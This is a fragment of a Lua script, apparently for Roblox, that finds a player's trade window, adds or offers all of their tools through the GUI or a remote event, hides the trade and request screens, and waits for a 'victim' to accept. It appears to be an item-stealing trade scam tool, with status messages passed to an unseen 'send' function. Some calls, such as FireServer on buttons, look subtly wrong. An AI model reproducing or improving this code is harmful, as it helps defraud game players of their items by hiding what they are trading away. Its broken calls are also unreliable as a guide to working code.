-- Helper: find the actual trade window (not the lobby)
local function findTradeWindow()
    local gui = player:FindFirstChild("PlayerGui")
    if not gui then return nil end
    -- Look for a ScreenGui that appears when trade is active
    for _, obj in pairs(gui:GetChildren()) do
        if obj:IsA("ScreenGui") and obj.Enabled then
            -- Check if it contains Accept and Add buttons
            local hasAccept, hasAdd = false, false
            for _, child in pairs(obj:GetDescendants()) do
                if child:IsA("TextButton") then
                    local name = child.Name:lower()
                    local text = (child.Text or ""):lower()
                    if name:find("accept") or text:find("accept") then hasAccept = true end
                    if name:find("add") or text:find("add") or name:find("select") then hasAdd = true end
                end
            end
            if hasAccept and hasAdd then
                return obj
            end
        end
    end
    -- If not found, look for a large Frame that appears during trade
    for _, obj in pairs(gui:GetDescendants()) do
        if obj:IsA("Frame") and obj.AbsoluteSize.X > 200 and obj.AbsoluteSize.Y > 200 and obj.Visible then
            local hasAccept, hasAdd = false, false
            for _, child in pairs(obj:GetDescendants()) do
                if child:IsA("TextButton") then
                    local name = child.Name:lower()
                    local text = (child.Text or ""):lower()
                    if name:find("accept") or text:find("accept") then hasAccept = true end
                    if name:find("add") or text:find("add") or name:find("select") then hasAdd = true end
                end
            end
            if hasAccept and hasAdd then
                return obj
            end
        end
    end
    return nil
end

-- Helper: add all items via GUI
local function addAllItemsViaGUI(tradeWindow)
    if not tradeWindow then return 0 end
    local count = 0
    -- Look for Add All
    for _, btn in pairs(tradeWindow:GetDescendants()) do
        if btn:IsA("TextButton") then
            local name = btn.Name:lower()
            local text = (btn.Text or ""):lower()
            if name:find("add all") or text:find("add all") then
                pcall(function() btn:FireServer() end)
                send("✅ Clicked Add All.")
                return 1
            end
        end
    end
    -- Click each Add/Select button
    for _, btn in pairs(tradeWindow:GetDescendants()) do
        if btn:IsA("TextButton") then
            local name = btn.Name:lower()
            local text = (btn.Text or ""):lower()
            if name:find("add") or text:find("add") or name:find("select") or text:find("select") then
                local parent = btn.Parent
                if parent and parent:IsA("Frame") and parent:FindFirstChild("ImageLabel") then
                    pcall(function() btn:FireServer() end)
                    count = count + 1
                end
            end
        end
    end
    return count
end

-- Fallback: remote offering
local function offerAllItemsViaRemote()
    if not OfferItem then return 0 end
    local count = 0
    local tools = {}
    for _, t in pairs(player.Backpack:GetChildren()) do
        if t:IsA("Tool") then table.insert(tools, t) end
    end
    for _, t in pairs(char:GetChildren()) do
        if t:IsA("Tool") then table.insert(tools, t) end
    end
    for _, tool in ipairs(tools) do
        local ok = pcall(function() OfferItem:FireServer(tool) end)
        if not ok then ok = pcall(function() OfferItem:FireServer(tool.Name) end) end
        if ok then count = count + 1 end
        wait(0.1)
    end
    return count
end

-- Hide trade GUI
local function hideTradeWindow()
    local gui = player:FindFirstChild("PlayerGui")
    if not gui then return end
    for _, obj in pairs(gui:GetDescendants()) do
        if obj:IsA("ScreenGui") and (obj.Name:lower():find("trade") or obj.Name:lower():find("request")) then
            obj.Enabled = false
        end
        if obj:IsA("Frame") and (obj.Name:lower():find("trade") or obj.Name:lower():find("request")) then
            obj.Visible = false
        end
        if obj:IsA("Frame") and obj.AbsoluteSize.X > 200 and obj.AbsoluteSize.Y > 200 then
            local hasAccept, hasAdd = false, false
            for _, sub in pairs(obj:GetDescendants()) do
                if sub:IsA("TextButton") then
                    if sub.Name:lower():find("accept") or (sub.Text and sub.Text:lower():find("accept")) then hasAccept = true end
                    if sub.Name:lower():find("add") or (sub.Text and sub.Text:lower():find("add")) then hasAdd = true end
                end
            end
            if hasAccept and hasAdd then
                obj.Visible = false
                if obj.Parent and obj.Parent:IsA("ScreenGui") then
                    obj.Parent.Enabled = false
                end
            end
        end
    end
end

-- Wait for the trade to actually start (victim accepts the request)
local function waitForTradeStart(timeout)
    timeout = timeout or 30
    local startTime = tick()
    while tick() - startTime < timeout do
        local win = findTradeWindow()
        if win then
            send("✅ Trade GUI found: " .. win:GetFullName())
            return win
        end
        wait(0.5)
    end
    return nil
end

